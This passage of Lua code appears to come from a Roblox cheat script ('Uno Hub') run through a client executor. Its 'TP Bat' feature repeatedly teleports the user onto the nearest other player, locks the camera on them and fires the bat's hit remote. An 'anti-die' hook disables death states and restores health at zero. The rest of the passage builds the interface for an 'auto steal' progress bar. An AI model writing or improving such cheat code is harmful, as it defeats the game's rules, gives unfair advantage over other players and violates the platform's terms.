	root.AssemblyLinearVelocity = Vector3.new(horizontal.X, math.clamp(velocity.Y, -50, 50), horizontal.Z)
	root.AssemblyAngularVelocity = Vector3.zero
	resetPhysicsRoot(root)
	end
	if humanoid then
	humanoid.AutoRotate = tpBatState.previousAutoRotate == nil and true or tpBatState.previousAutoRotate
	pcall(function()
	humanoid.PlatformStand = false
	humanoid.Sit = false
	local state = humanoid:GetState()
	if state == Enum.HumanoidStateType.Physics
	or state == Enum.HumanoidStateType.Ragdoll
	or state == Enum.HumanoidStateType.FallingDown then
	humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
	humanoid:ChangeState(Enum.HumanoidStateType.Running)
	end
	local camera = workspace.CurrentCamera
	if camera then camera.CameraSubject = humanoid end
	end)
	end
	tpBatState.previousAutoRotate = nil

	if wasEnabled and root then
	task.spawn(function()
	for _ = 1, 12 do
	RunService.Heartbeat:Wait()
	if tpBatState.enabled or tpBatState.returnGeneration ~= stopGeneration then return end
	if _G.__UNO_STATE ~= crystalRuntimeState then return end
	local _, currentRoot, currentHumanoid = getRig()
	if currentRoot ~= root or not currentHumanoid or currentHumanoid.Health <= 0 then return end
	local currentVelocity = currentRoot.AssemblyLinearVelocity
	local currentHorizontal = Vector3.new(currentVelocity.X, 0, currentVelocity.Z)
	if currentHorizontal.Magnitude > 120 then currentHorizontal = currentHorizontal.Unit * 120 end
	currentRoot.AssemblyLinearVelocity = Vector3.new(currentHorizontal.X, math.clamp(currentVelocity.Y, -50, 50), currentHorizontal.Z)
	currentRoot.AssemblyAngularVelocity = Vector3.zero
	resetPhysicsRoot(currentRoot)
	end
	end)
	end

	if wasEnabled then
	task.delay(0.4, function()
	if tpBatState.enabled or tpBatState.returnGeneration ~= stopGeneration then return end
	if _G.__UNO_STATE ~= crystalRuntimeState then return end
	pcall(function() if _G.__UnoAntiDieSet then _G.__UnoAntiDieSet(false) end end)
	end)
	else
	pcall(function() if _G.__UnoAntiDieSet then _G.__UnoAntiDieSet(false) end end)
	end
	end

	local function startTPBat()
	if tpBatState.enabled then return end
	tpBatState.returnGeneration = (tpBatState.returnGeneration or 0) + 1
	if toggleStates["Autoplay"] and _G.__stopAutoplay then _G.__stopAutoplay() end
	tpBatState.enabled = true

	pcall(function() if _G.__UnoAntiDieSet then _G.__UnoAntiDieSet(true) end end)
	tpBatState.target = nil
	tpBatState.samples = {}
	tpBatState.swingLocked = false
	tpBatState.nextSwingAt = 0
	tpBatState.lastPosition = nil
	tpBatState.lastSampleTime = tick()
		tpBatState.recoverUntil = 0
		tpBatState.physicsPauseUntil = 0

		tpBatState.startingUntil = tick() + 0.35
	local _, root, humanoid = getRig()
	if root then
	resetPhysicsRoot(root)
	if root.Position.Y > -30 then tpBatState.lastSafeCFrame = root.CFrame end
	end
	if humanoid then tpBatState.previousAutoRotate = humanoid.AutoRotate end
		if tpBatState.heartbeat then tpBatState.heartbeat:Disconnect() end
		tpBatState.heartbeat = RunService.Heartbeat:Connect(selectedHeartbeatStep)

		task.spawn(function() pcall(selectedHeartbeatStep) end)
	end

	-- The previous Uno TP Bat engine is intentionally left disconnected.
	-- The toggle below now uses the direct Cursed TP Bat engine only; this does
	-- not create a second GUI and is controlled exclusively by the existing UI.
	local cursedDirectBat = {
		enabled = false,
		connection = nil,
		hitCooldown = false,
		antiDieConnections = {},
	}

	local function cursedDisconnectAntiDie()
		for _, connection in ipairs(cursedDirectBat.antiDieConnections) do
			pcall(function() connection:Disconnect() end)
		end
		cursedDirectBat.antiDieConnections = {}
	end

	local function cursedHookAntiDie(character)
		cursedDisconnectAntiDie()
		if not cursedDirectBat.enabled or not character then return end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoid then return end
		pcall(function()
			humanoid.BreakJointsOnDeath = false
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Dying, false)
		end)
		cursedDirectBat.antiDieConnections[#cursedDirectBat.antiDieConnections + 1] = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
			if cursedDirectBat.enabled and humanoid.Parent and humanoid.Health <= 0 then
				pcall(function()
					humanoid.Health = humanoid.MaxHealth
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end
		end)
	end

	local function cursedFindBat()
		local character = Player.Character
		if not character then return nil end
		local function isBat(item)
			local name = item.Name:lower()
			return item:IsA("Tool") and (name:find("bat") or name:find("slap"))
		end
		for _, child in ipairs(character:GetChildren()) do
			if isBat(child) then return child end
		end
		local backpack = Player:FindFirstChildOfClass("Backpack")
		if backpack then
			for _, child in ipairs(backpack:GetChildren()) do
				if isBat(child) then
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then pcall(function() humanoid:EquipTool(child) end) end
					return child
				end
			end
		end
		return nil
	end

	local function cursedNearestPlayerTarget(root)
		local target, distance = nil, math.huge
		for _, otherPlayer in ipairs(Players:GetPlayers()) do
			local character = otherPlayer ~= Player and otherPlayer.Character
			local otherRoot = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if otherRoot and humanoid and humanoid.Health > 0 then
				local candidateDistance = (root.Position - otherRoot.Position).Magnitude
				if candidateDistance < distance then
					target, distance = otherPlayer, candidateDistance
				end
			end
		end
		return target, distance
	end

	local function cursedSwing()
		if cursedDirectBat.hitCooldown then return end
		cursedDirectBat.hitCooldown = true
		pcall(function()
			local bat = cursedFindBat()
			if not bat then return end
			bat:Activate()
			local remote = bat:FindFirstChildWhichIsA("RemoteEvent")
			if remote then remote:FireServer() end
		end)
		task.delay(0.08, function() cursedDirectBat.hitCooldown = false end)
	end

	local function cursedTPBatTick()
		if not cursedDirectBat.enabled then return end
		local character = Player.Character
		local root = character and character:FindFirstChild("HumanoidRootPart")
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		if not root or not humanoid or humanoid.Health <= 0 then return end
		local bat = cursedFindBat()
		if bat and bat.Parent ~= character then pcall(function() humanoid:EquipTool(bat) end) end
		local target, distance = cursedNearestPlayerTarget(root)
		local targetRoot = target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
		if not targetRoot or distance > 100 then return end
		root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0, 0.9, 0))
		root.AssemblyLinearVelocity = targetRoot.AssemblyLinearVelocity
		local camera = workspace.CurrentCamera
		if camera then camera.CFrame = CFrame.new(camera.CFrame.Position, targetRoot.Position) end
		cursedSwing()
		for _, part in ipairs(character:GetDescendants()) do
			if part:IsA("BasePart") then part.CanCollide = false end
		end
	end

	local function cursedSetTPBatEnabled(active)
		active = active == true
		cursedDirectBat.enabled = active
		if cursedDirectBat.connection then
			cursedDirectBat.connection:Disconnect()
			cursedDirectBat.connection = nil
		end
		cursedDisconnectAntiDie()
		if active then
			cursedHookAntiDie(Player.Character)
			cursedDirectBat.connection = RunService.Heartbeat:Connect(cursedTPBatTick)
		end
		return cursedDirectBat.enabled
	end

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(character)
		if cursedDirectBat.enabled then
			task.wait(0.1)
			cursedHookAntiDie(character)
		end
	end))

	FeaturePostToggle["TP Bat"] = function(active)
		if active then
			deactivateOtherAimbots("TP Bat")
			_G.__deactivateBatExclusive("TP Bat")
		end
		return cursedSetTPBatEnabled(active)
	end

	_G.__UnoTrackStopper(function()
		pcall(cursedSetTPBatEnabled, false)
		pcall(stopTPBat)
		pcall(clearLastTargetMarker)
	end)

	_G.UnoAutoBat = {
	GetVersion = function() return _G.__batVersion or 1 end,
	SetVersion = function(v)
	_G.__batVersion = tonumber(v) == 2 and 2 or 1
	tpBatState.samples = {}
	tpBatState.lastPosition = nil
	tpBatState.lastSampleTime = tick()
	tpBatState.recoverUntil = 0
	tpBatState.physicsPauseUntil = 0
	if _G.__batVersionPill then
	_G.__batVersionPill.Text = "V" .. tostring(_G.__batVersion)
	end
	if _G.__UnoUpdateBatVersionButton then _G.__UnoUpdateBatVersionButton() end
	if _G.__UnoRefreshVisibleTPBatConfig then _G.__UnoRefreshVisibleTPBatConfig() end
	saveConfig()
	if tpBatState.enabled then
	local _, root = getRig()
	if root then resetPhysicsRoot(root) end
	selectedHeartbeatStep()
	end
	return _G.__batVersion
	end,
	GetV2Distance = getTPBatDistance,
	SetV2Distance = function(value)
	local normalized = tostring(value):gsub(",", ".")
	local distance = tonumber(normalized)
	local valid = distance and distance == distance and math.abs(distance) < math.huge
	if valid then
	_G.__tpBatV2Distance = math.floor(math.clamp(distance, 0, 100) * 100 + 0.5) / 100
	end
	if _G.__UnoUpdateBatVersionButton then _G.__UnoUpdateBatVersionButton() end
	if _G.__UnoRefreshVisibleTPBatConfig then _G.__UnoRefreshVisibleTPBatConfig() end
	if valid then
	saveConfig()
	if tpBatState.enabled then selectedHeartbeatStep() end
	end
	return getTPBatDistance()
	end,
	SetEnabled = function(active)
	active = active == true
	toggleStates["TP Bat"] = active
	if toggleStateSetters["TP Bat"] then pcall(toggleStateSetters["TP Bat"], active) end
	FeaturePostToggle["TP Bat"](active)
	if toggleVisualUpdaters["TP Bat"] then pcall(toggleVisualUpdaters["TP Bat"]) end
	saveConfig()
		return cursedDirectBat.enabled
	end,
	Toggle = function()
	return _G.UnoAutoBat.SetEnabled(not (toggleStates["TP Bat"] == true))
	end,
	Stop = function() pcall(cursedSetTPBatEnabled, false) end,
	}
	end
end)()

	local farmingSection = combatSection

	local dropRow = makeToggle(farmingSection, "Drop", "Drop")
	pcall(function() styleSmallToggle(dropRow) end)
	local autoGrabRow = makeToggle(farmingSection, "Auto Grab", "auto steal")
	pcall(function() styleSmallToggle(autoGrabRow) end)

	-- Steal bar in own function scope (avoids 200 local register limit)
	;(function()
	local grabBarGui = Instance.new("Frame", ScreenGui)
	grabBarGui.Name = "UnoAutoGrabBar"
	grabBarGui.AnchorPoint = Vector2.new(0, 0)
	local defaultExpandedW = isMobile and 270 or 360
	local defaultCollapsedW = isMobile and 240 or 320
	local partialCollapsedW = math.floor((defaultExpandedW + defaultCollapsedW) / 2)
	local savedSize = _G["_UnoHub_UI_AutoGrabBarSize"]
	local grabBarExpanded = _G["_UnoHub_UI_AutoGrabExpanded"] ~= nil and _G["_UnoHub_UI_AutoGrabExpanded"] or true
	local savedWidth = tonumber(savedSize)
	local barStyle = "1"
	_G["_UnoHub_UI_AutoGrabBarStyle"] = barStyle
	local initialBarScale = math.clamp(tonumber(_G["_UnoHub_UI_AutoGrabBarScale"] or 1) or 1, 0.6, 1.6)

	if savedWidth and savedWidth < defaultCollapsedW then savedWidth = nil end
	local currentW = savedWidth and math.clamp(savedWidth, defaultCollapsedW, defaultExpandedW) or defaultExpandedW
	if savedSize and tonumber(savedSize) and tonumber(savedSize) <= defaultCollapsedW then
	grabBarExpanded = false
	end
	_G["_UnoHub_UI_AutoGrabExpanded"] = grabBarExpanded
	local grabBarSize = UDim2.new(0, currentW, 0, isMobile and 52 or 64)
	grabBarGui.Size = grabBarSize
	local barUiScale = Instance.new("UIScale")
	barUiScale.Scale = initialBarScale
	barUiScale.Parent = grabBarGui
	_G["_UnoHub_UI_AutoGrabBarScale"] = initialBarScale

	local savedBarPos = _G["_UnoHub_UI_AutoGrabBarPos"]
	if savedBarPos and savedBarPos.x and savedBarPos.y then
	grabBarGui.Position = UDim2.fromOffset(savedBarPos.x, savedBarPos.y)
	else
	grabBarGui.Position = UDim2.new(0.5, -currentW / 2, 0.80, 0)
	end
	grabBarGui.BackgroundColor3 = Color3.fromRGB(4, 4, 6)
	grabBarGui.BackgroundTransparency = 0
	grabBarGui.BorderSizePixel = 0
	grabBarGui.ZIndex = 500
	grabBarGui.Active = true
	grabBarGui.Draggable = false
	grabBarGui.Visible = toggleStates["Steal Bar"] == true
	grabBarGui.ClipsDescendants = true
	Instance.new("UICorner", grabBarGui).CornerRadius = UDim.new(0, isMobile and 11 or 13)
	local barStrokeInst = Instance.new("UIStroke", grabBarGui)
	barStrokeInst.Color = Color3.fromRGB(55, 55, 60)
	barStrokeInst.Thickness = 1.2
	barStrokeInst.Transparency = 0.18
	barStrokeInst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local outerReliefGradient = Instance.new("UIGradient", grabBarGui)
	outerReliefGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(13, 13, 17)),
	ColorSequenceKeypoint.new(0.55, Color3.fromRGB(5, 5, 8)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0)),
	})
	outerReliefGradient.Rotation = 90

	local topRow = Instance.new("Frame", grabBarGui)
	topRow.Size = UDim2.new(0, isMobile and 70 or 82, 1, -4)
	topRow.Position = UDim2.new(1, isMobile and -72 or -84, 0, 2)
	topRow.BackgroundTransparency = 1
	topRow.Visible = false
	topRow.ZIndex = 504

	local statsDivider = Instance.new("Frame", topRow)
	statsDivider.Name = "Divider"
	statsDivider.Size = UDim2.new(0, 1, 1, -10)
	statsDivider.Position = UDim2.new(0, 0, 0, 5)
	statsDivider.BorderSizePixel = 0
	statsDivider.BackgroundColor3 = Color3.fromRGB(58, 58, 64)
	statsDivider.BackgroundTransparency = 0.25
	statsDivider.ZIndex = 505

	StatsRightFps = Instance.new("TextLabel", topRow)
	StatsRightFps.Size = UDim2.new(1, -10, 0, 14)
	StatsRightFps.Position = UDim2.new(0, isMobile and 7 or 9, 0, isMobile and 6 or 9)
	StatsRightFps.BackgroundTransparency = 1
	StatsRightFps.TextColor3 = Color3.fromRGB(245, 245, 248)
	StatsRightFps.Font = Enum.Font.GothamBold
	StatsRightFps.TextSize = isMobile and 8 or 9
	StatsRightFps.TextXAlignment = Enum.TextXAlignment.Left
	StatsRightFps.ZIndex = 506
	StatsRightFps.Visible = false

	StatsRightPing = Instance.new("TextLabel", topRow)
	StatsRightPing.Size = UDim2.new(1, -10, 0, 14)
	StatsRightPing.Position = UDim2.new(0, isMobile and 7 or 9, 0, isMobile and 23 or 27)
	StatsRightPing.BackgroundTransparency = 1
	StatsRightPing.TextColor3 = Color3.fromRGB(200, 200, 208)
	StatsRightPing.Font = Enum.Font.GothamBold
	StatsRightPing.TextSize = isMobile and 8 or 9
	StatsRightPing.TextXAlignment = Enum.TextXAlignment.Left
	StatsRightPing.ZIndex = 506
	StatsRightPing.Visible = false

	local percentLabel = Instance.new("TextLabel", topRow)
	percentLabel.Size = UDim2.new(0, 54, 1, 0)
	percentLabel.Position = UDim2.new(1, -84, 0, 0)
	percentLabel.BackgroundTransparency = 1
	percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	percentLabel.Font = Enum.Font.GothamBold
	percentLabel.TextSize = 11
	percentLabel.TextXAlignment = Enum.TextXAlignment.Right
	percentLabel.ZIndex = 502
	percentLabel.Visible = false

	local resizeBtn = Instance.new("TextButton", grabBarGui)
	resizeBtn.Size = UDim2.new(0, 16, 0, 16)
	resizeBtn.Position = UDim2.new(1, -22, 0, 3)
	resizeBtn.AnchorPoint = Vector2.new(0, 0)
	resizeBtn.BackgroundTransparency = 0.2
	resizeBtn.BackgroundColor3 = Color3.fromRGB(110, 110, 110)
	resizeBtn.TextColor3 = Color3.fromRGB(235, 240, 245)
	resizeBtn.Font = Enum.Font.GothamBold
	resizeBtn.TextSize = 10
	resizeBtn.Text = "−"
	resizeBtn.Visible = true
	Instance.new("UICorner", resizeBtn).CornerRadius = UDim.new(1,0)
	resizeBtn.ZIndex = 510

	local resizeUpBtn = Instance.new("TextButton", grabBarGui)
	resizeUpBtn.Name = "ResizeBarLarger"
	resizeUpBtn.Size = UDim2.fromOffset(16, 16)
	resizeUpBtn.Position = UDim2.new(1, -42, 0, 3)
	resizeUpBtn.BackgroundTransparency = 0.2
	resizeUpBtn.BackgroundColor3 = Color3.fromRGB(110, 110, 110)
	resizeUpBtn.TextColor3 = Color3.fromRGB(235, 240, 245)
	resizeUpBtn.Font = Enum.Font.GothamBold
	resizeUpBtn.TextSize = 10
	resizeUpBtn.Text = "+"
	resizeUpBtn.ZIndex = 510
	Instance.new("UICorner", resizeUpBtn).CornerRadius = UDim.new(1, 0)

	local barBg
	local function applyBarWidth(newW)
	if not newW or tonumber(newW) == nil then
	return
	end

	local ok, _ = pcall(function()
	if grabBarGui and grabBarGui.Size and grabBarGui.Size.Y then
	local yOffset = grabBarGui.Size.Y.Offset or (isMobile and 52 or 64)
	grabBarGui.Size = UDim2.new(0, tonumber(newW), 0, yOffset)
	end
	if barBg and barBg.Size then
	barBg.Size = UDim2.new(1, isMobile and -76 or -88, 1, -4)
	end
	end)
	if ok then
	_G["_UnoHub_UI_AutoGrabBarSize"] = tonumber(newW)
	pcall(saveConfig)
	end
	end
	if not grabBarExpanded then
	applyBarWidth(partialCollapsedW)
	end

	local function changeBarScale(delta)
		barUiScale.Scale = math.clamp(math.floor((barUiScale.Scale + delta) * 10 + 0.5) / 10, 0.6, 1.6)
		_G["_UnoHub_UI_AutoGrabBarScale"] = barUiScale.Scale
		pcall(saveConfig)
	end
	resizeBtn.MouseButton1Click:Connect(function() changeBarScale(-0.1) end)
	resizeUpBtn.MouseButton1Click:Connect(function() changeBarScale(0.1) end)

	-- Screenshot-style Auto Grab bar (theme-aware)
	grabBarGui.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
	outerReliefGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 22, 28)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 8, 12)),
	})
	barStrokeInst.Color = Color3.fromRGB(55, 55, 65)
	barStrokeInst.Thickness = 1.4
	barStrokeInst.Transparency = 0.25

	-- Icon image on steal bar
	local sLetter = nil
	local sSub = nil
	local leftDivider = nil
	-- Full-bar theme image (red/blue)
	local stealBarIcon = Instance.new("ImageLabel", grabBarGui)
	stealBarIcon.Name = "StealBarIcon"
	stealBarIcon.Size = UDim2.new(1, 0, 1, 0)
	stealBarIcon.Position = UDim2.new(0, 0, 0, 0)
	stealBarIcon.BackgroundTransparency = 1
	stealBarIcon.BorderSizePixel = 0
	stealBarIcon.Image = ""
	stealBarIcon.ScaleType = Enum.ScaleType.Crop
	stealBarIcon.ImageTransparency = 0.1
	stealBarIcon.ZIndex = 501
	stealBarIcon.ClipsDescendants = true
		Instance.new("UICorner", stealBarIcon).CornerRadius = UDim.new(0, isMobile and 11 or 13)

	-- Compact style icon placeholder; the asset ID can be supplied later.
	local compactStyleIcon = Instance.new("ImageLabel", grabBarGui)
	compactStyleIcon.Name = "CompactStyleIcon"
	compactStyleIcon.Size = UDim2.fromOffset(24, 24)
	compactStyleIcon.Position = UDim2.new(0, 8, 0.5, -12)
	compactStyleIcon.BackgroundColor3 = Color3.fromRGB(55, 55, 62)
	compactStyleIcon.BackgroundTransparency = 0.05
	compactStyleIcon.BorderSizePixel = 0
	compactStyleIcon.Image = tostring(_G.__UnoAutoGrabStyle2ImageId or "")
	compactStyleIcon.ImageTransparency = 1
	compactStyleIcon.ScaleType = Enum.ScaleType.Crop
	compactStyleIcon.Visible = false
	compactStyleIcon.ZIndex = 506
	Instance.new("UICorner", compactStyleIcon).CornerRadius = UDim.new(0, 6)

	-- V1/V2 mode pill (clickable → switches Auto Steal version)
	local modePill = Instance.new("TextButton", grabBarGui)
	modePill.Size = UDim2.new(0, 28, 0, 16)
	modePill.Position = UDim2.new(0, 12, 0, isMobile and 8 or 10)
	modePill.BackgroundColor3 = Color3.fromRGB(140, 90, 220)
	modePill.BorderSizePixel = 0
	modePill.Text = "V1"
	modePill.Font = Enum.Font.GothamBlack
	modePill.TextSize = 9
	modePill.TextColor3 = Color3.fromRGB(255, 255, 255)
	modePill.ZIndex = 506
	modePill.AutoButtonColor = false
	Instance.new("UICorner", modePill).CornerRadius = UDim.new(0, 5)

	-- AUTO GRAB title
	local autoGrabTitle = Instance.new("TextLabel", grabBarGui)
	autoGrabTitle.Size = UDim2.new(1, -90, 0, 18)
	autoGrabTitle.Position = UDim2.new(0, 46, 0, isMobile and 7 or 9)
	autoGrabTitle.BackgroundTransparency = 1
	autoGrabTitle.Text = "AUTO GRAB"
	autoGrabTitle.Font = Enum.Font.GothamBlack
	autoGrabTitle.TextSize = isMobile and 11 or 12
	autoGrabTitle.TextColor3 = Color3.fromRGB(245, 245, 250)
	autoGrabTitle.TextXAlignment = Enum.TextXAlignment.Left
	autoGrabTitle.ZIndex = 506

	-- Percent (right)
	local percentLabel = Instance.new("TextLabel", grabBarGui)
	percentLabel.Size = UDim2.new(0, 52, 0, 18)
	percentLabel.Position = UDim2.new(1, -102, 0, isMobile and 7 or 9)
	percentLabel.BackgroundTransparency = 1
	percentLabel.Text = "0%"
	percentLabel.Font = Enum.Font.GothamBlack
	percentLabel.TextSize = isMobile and 14 or 16
	percentLabel.TextColor3 = Color3.fromRGB(245, 245, 250)
	percentLabel.TextXAlignment = Enum.TextXAlignment.Right
	percentLabel.ZIndex = 506

	-- Thin progress track
	barBg = Instance.new("Frame", grabBarGui)
	barBg.Size = UDim2.new(1, isMobile and -20 or -24, 0, 11)
	barBg.Position = UDim2.new(0, isMobile and 10 or 12, 1, isMobile and -18 or -20)
	barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
	barBg.BorderSizePixel = 0
	barBg.ZIndex = 504
	Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)
	local barTrackStroke = Instance.new("UIStroke", barBg)
	barTrackStroke.Transparency = 1

	local barFill = Instance.new("Frame", barBg)
	barFill.Size = UDim2.new(0, 0, 1, 0)
	barFill.Position = UDim2.new(0, 0, 0, 0)
	barFill.BorderSizePixel = 0
	barFill.BackgroundColor3 = Color3.fromRGB(255, 90, 160)
	barFill.ClipsDescendants = true
	barFill.ZIndex = 505
	Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
	local fillGradient = Instance.new("UIGradient", barFill)
	-- White tracking shine: it is vertically centered and follows the live
	-- progress edge at exactly the same speed, while staying inside the frame.
	local fillGlow = Instance.new("Frame")
	fillGlow.Name = "ProgressInsetGlow"
	fillGlow.Size = UDim2.new(0, isMobile and 54 or 72, 1, -2)
	fillGlow.AnchorPoint = Vector2.new(0.5, 0.5)
	fillGlow.Position = UDim2.new(1, isMobile and -39 or -52, 0.5, 0)
	fillGlow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	fillGlow.BackgroundTransparency = 0.25
	fillGlow.BorderSizePixel = 0
	fillGlow.ZIndex = 505
	fillGlow.Parent = barFill
	Instance.new("UICorner", fillGlow).CornerRadius = UDim.new(1, 0)
	local glowStroke = Instance.new("UIStroke")
	glowStroke.Color = Color3.fromRGB(255, 255, 255)
	glowStroke.Thickness = isMobile and 2 or 3
	glowStroke.Transparency = 0.42
	glowStroke.Parent = fillGlow
	local glowGradient = Instance.new("UIGradient")
	glowGradient.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.52, 0.02),
		NumberSequenceKeypoint.new(1, 1),
	})
	glowGradient.Parent = fillGlow
	local fillShine = Instance.new("Frame")
	fillShine.Name = "ProgressInsetShine"
	fillShine.Size = UDim2.new(0, isMobile and 32 or 42, 1, -4)
	fillShine.AnchorPoint = Vector2.new(0.5, 0.5)
	fillShine.Position = UDim2.new(1, isMobile and -28 or -37, 0.5, 0)
	fillShine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	fillShine.BackgroundTransparency = 0.06
	fillShine.BorderSizePixel = 0
	fillShine.ZIndex = 506
	fillShine.Parent = barFill
	Instance.new("UICorner", fillShine).CornerRadius = UDim.new(1, 0)
	local shineGradient = Instance.new("UIGradient")
	shineGradient.Rotation = 0
	shineGradient.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.42, 0.05),
		NumberSequenceKeypoint.new(1, 1),
	})
	shineGradient.Parent = fillShine
	task.spawn(function()
		while fillGlow.Parent and fillShine.Parent do
			local glowIn = TweenService:Create(fillGlow, TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {BackgroundTransparency = 0.02})
			local shineIn = TweenService:Create(fillShine, TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {BackgroundTransparency = 0})
			glowIn:Play(); shineIn:Play(); glowIn.Completed:Wait()
			if not fillGlow.Parent or not fillShine.Parent then break end
			local glowOut = TweenService:Create(fillGlow, TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {BackgroundTransparency = 0.32})
			local shineOut = TweenService:Create(fillShine, TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {BackgroundTransparency = 0.16})
			glowOut:Play(); shineOut:Play(); glowOut.Completed:Wait()
		end
	end)

	local barThemeColor = Color3.fromRGB(255, 90, 160)
	local function resolveAutoStealAccent()
		if typeof(_G.__UnoCurtAccent) == "Color3" then return _G.__UnoCurtAccent end
		if typeof(_G.__UnoThemeAccent) == "Color3" then return _G.__UnoThemeAccent end
		local index = tonumber(_G["_UnoHub_UI_BgIndex"]) or 1
		if index == 2 then return Color3.fromRGB(255, 120, 214) end
		if index == 3 then return Color3.fromRGB(89, 176, 255) end
		return Color3.fromRGB(255, 90, 160)
	end
	local STEAL_ICON_RED = "rbxassetid://136216519607305"
	local STEAL_ICON_PINK = "rbxassetid://89473630902438"
	local STEAL_ICON_BLUE = "rbxassetid://88490550995354"
	local STEAL_ICON_HALLOWEEN = "rbxassetid://111895594505605"

	-- Top status HUD: it uses the exact artwork selected for the Steal Bar.
	local oldTopHud = ScreenGui:FindFirstChild("KYejuTopStatus")
	if oldTopHud then oldTopHud:Destroy() end
	local function applyAutoGrabBarStyle(style, shouldSave)
	barStyle = style == "2" and "2" or "1"
	_G["_UnoHub_UI_AutoGrabBarStyle"] = barStyle
	local compact = barStyle == "2"
	local savedNormalWidth = tonumber(_G["_UnoHub_UI_AutoGrabBarSize"]) or currentW
	local width = savedNormalWidth
	local previousPosition = grabBarGui.Position
	grabBarGui.Size = UDim2.fromOffset(width, isMobile and 52 or 64)
	if previousPosition.X.Scale == 0.5 then
		grabBarGui.Position = UDim2.new(0.5, -width / 2, previousPosition.Y.Scale, previousPosition.Y.Offset)
	end
	grabBarGui.BackgroundTransparency = 0
	grabBarGui.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
	outerReliefGradient.Color = ColorSequence.new(Color3.fromRGB(22, 22, 28), Color3.fromRGB(8, 8, 12))
	barStrokeInst.Color = barThemeColor:Lerp(Color3.fromRGB(255, 255, 255), 0.15)
	barStrokeInst.Thickness = 1.4
	barStrokeInst.Transparency = 0.25
	-- Both styles use the same theme image and themed outline; style 2 only
	-- changes the compact layout of the text and progress bar.
	stealBarIcon.Visible = true
	compactStyleIcon.Visible = false
	modePill.Visible = not compact
	autoGrabTitle.Visible = not compact
	percentLabel.Visible = true
	topRow.Visible = false
	statsDivider.Visible = not compact
	if compact then
		percentLabel.Size = UDim2.fromOffset(38, 16)
		percentLabel.Position = UDim2.fromOffset(36, 2)
		percentLabel.TextSize = 10
		percentLabel.TextXAlignment = Enum.TextXAlignment.Left
		percentLabel.ZIndex = 507
		StatsRightFps.Parent = grabBarGui
		StatsRightFps.Size = UDim2.fromOffset(44, 10)
		StatsRightFps.Position = UDim2.new(1, -111, 0, 4)
		StatsRightFps.TextSize = 6
		StatsRightFps.TextXAlignment = Enum.TextXAlignment.Right
		StatsRightFps.Visible = true
		StatsRightFps.ZIndex = 507
		StatsRightPing.Parent = grabBarGui
		StatsRightPing.Size = UDim2.fromOffset(62, 10)
		StatsRightPing.Position = UDim2.new(1, -64, 0, 4)
		StatsRightPing.TextSize = 6
		StatsRightPing.TextXAlignment = Enum.TextXAlignment.Right
		StatsRightPing.Visible = true
		StatsRightPing.ZIndex = 507
		barBg.Size = UDim2.new(1, -72, 0, 5)
		barBg.Position = UDim2.new(0, 36, 1, -10)
		barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
		resizeBtn.Size = UDim2.fromOffset(14, 14)
		resizeBtn.Position = UDim2.new(1, -18, 1, -17)
		resizeUpBtn.Size = UDim2.fromOffset(14, 14)
		resizeUpBtn.Position = UDim2.new(1, -36, 1, -17)
		resizeUpBtn.TextSize = 9
		resizeBtn.TextSize = 9
		for _, child in ipairs(barFill:GetChildren()) do
			if child.Name == "ProgressInsetGlow" or child.Name == "ProgressInsetShine" then
				child.Visible = false
			end
		end
		local particles = grabBarGui:FindFirstChild("ThemeParticles")
		if particles then particles.Visible = false end
	else
		percentLabel.Size = UDim2.fromOffset(52, 18)
		percentLabel.Position = UDim2.new(1, -102, 0, isMobile and 7 or 9)
		percentLabel.TextSize = isMobile and 14 or 16
		percentLabel.TextXAlignment = Enum.TextXAlignment.Right
		percentLabel.ZIndex = 502
		StatsRightFps.Parent = topRow
		StatsRightFps.Size = UDim2.new(1, -10, 0, 14)
		StatsRightFps.Position = UDim2.new(0, isMobile and 7 or 9, 0, isMobile and 6 or 9)
		StatsRightFps.TextSize = isMobile and 8 or 9
		StatsRightFps.TextXAlignment = Enum.TextXAlignment.Left
		StatsRightFps.Visible = false
		StatsRightPing.Parent = topRow
		StatsRightPing.Size = UDim2.new(1, -10, 0, 14)
		StatsRightPing.Position = UDim2.new(0, isMobile and 7 or 9, 0, isMobile and 23 or 27)
		StatsRightPing.TextSize = isMobile and 8 or 9
		StatsRightPing.TextXAlignment = Enum.TextXAlignment.Left
		StatsRightPing.Visible = false
		barBg.Size = UDim2.new(1, isMobile and -20 or -24, 0, 11)
		barBg.Position = UDim2.new(0, isMobile and 10 or 12, 1, isMobile and -18 or -20)
		barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
		resizeBtn.Size = UDim2.fromOffset(16, 16)
